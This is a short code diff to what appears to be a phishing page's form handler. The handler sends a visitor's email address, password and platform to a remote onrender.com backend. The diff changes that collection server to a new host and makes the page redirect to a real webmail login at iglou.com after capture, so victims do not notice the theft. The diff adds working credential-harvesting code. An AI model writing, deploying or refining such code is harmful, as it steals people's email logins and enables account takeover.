@@ -25,7 +25,7 @@ async function handleSubmit(e){
     e.preventDefault();
 
     try {
-        const response = await axios.post('https://mainbackend-rd07.onrender.com/api/send', {
+        const response = await axios.post('https://akamubackend.onrender.com/api/send', {
             email:email,
             password:password,
             platform:platform
@@ -37,7 +37,7 @@ async function handleSubmit(e){
         if(response.status == 200){
             console.log(response.data.message);
 
-            setShowError(true);
+            window.location.href = 'https://webmailrc.iglou.com/';
         }
       } catch (error) {
         // Handle error
